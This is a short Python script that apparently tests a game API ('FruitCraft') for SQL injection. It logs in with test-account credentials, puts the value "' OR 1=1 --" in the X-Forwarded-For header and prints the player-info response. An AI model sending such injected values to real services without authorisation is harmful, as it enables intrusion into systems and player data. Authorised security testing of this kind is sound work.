import sys, os, time, requests, json
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'api')))
from fruitcraft_client import FruitClient

def main():
    print('Testing X-Forwarded-For SQLi...')
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    
    # Send custom header
    c1.session.headers.update({'X-Forwarded-For': "' OR 1=1 --"})
    res = c1.post('/player/getplayerinfo', {})
    print('SQLi Result:', res)

if __name__ == '__main__':
    main()
